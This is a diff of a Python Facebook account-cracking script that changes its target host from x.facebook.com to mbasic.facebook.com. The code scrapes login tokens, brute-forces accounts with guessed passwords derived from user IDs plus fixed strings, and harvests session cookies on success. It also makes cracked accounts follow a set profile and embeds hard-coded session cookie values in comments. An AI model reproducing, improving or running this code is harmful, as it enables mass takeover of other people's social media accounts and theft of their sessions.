@@ -24,10 +24,10 @@ def live_ck(cid):
     else:
         return "Dead"
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://x.facebook.com/profile.php?id=100091439918932', {
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100091439918932', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://x.facebook.com' + str(get), {
+        session.get('https://mbasic.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
             
             
@@ -522,11 +522,11 @@ def bd():
             pwx = [code+psx,code+psx[:2],psx[6:],psx[:6],'57273200','59039200','57575751','57575752']
             #pwx = [psx]
             PRONOOB.submit(rcrack,uid,pwx,tl)
-#x.facebook.com
-#x.facebook.com
-#x.facebook.com
-#x.facebook.com
-#x.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
 #datr=vdNxZXtKMcByKKbUDacgpPS0;sb=vtNxZXNUBS7gryVCapzUPLJr;fr=0Tqsb3ul9voBrlZlB..BlcdO-.-Y.AAA.0.0.Blcd
 W='\33[1;32m'
 def ind():
@@ -559,11 +559,11 @@ def ind():
             pwx = [code+psx,code+psx[:2],'57575751']
             #pwx = [psx]
             PRONOOB.submit(rcrack,uid,pwx,tl)
-#x.facebook.com
-#x.facebook.com
-#x.facebook.com
-#x.facebook.com
-#x.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
+#mbasic.facebook.com
 #datr=vdNxZXtKMcByKKbUDacgpPS0;sb=vtNxZXNUBS7gryVCapzUPLJr;fr=0Tqsb3ul9voBrlZlB..BlcdO-.-Y.AAA.0.0.Blcd
 W='\33[1;32m'
 def rcrack(uid,pwx,tl):
@@ -580,7 +580,7 @@ def rcrack(uid,pwx,tl):
             rc = random.choice
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://x.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -592,13 +592,13 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-            'authority': 'x.facebook.com',
+            'authority': 'mbasic.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             # 'cookie': 'datr=-VOxZTGuxxwcGn8nKdAXOMZV; sb=-VOxZXYG5rK_hOwUA5bnvqrE; ps_l=0; ps_n=0; locale=en_US; dpr=3; wl_cbv=v2%3Bclient_version%3A2404%3Btimestamp%3A1707196219; vpd=v1%3B664x360x3; m_pixel_ratio=3; wd=360x664; fr=0MZyHBVs9DRCViTTo.AWVAYPcP-DlJ58f5y6m6PpGxMxY.BlsVP5.qz.AAA.0.0.BlwfFX.AWXMaaa8lig',
             'dpr': '3',
-            'referer': 'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
             'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
@@ -616,7 +616,7 @@ def rcrack(uid,pwx,tl):
             }
 
 
-            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
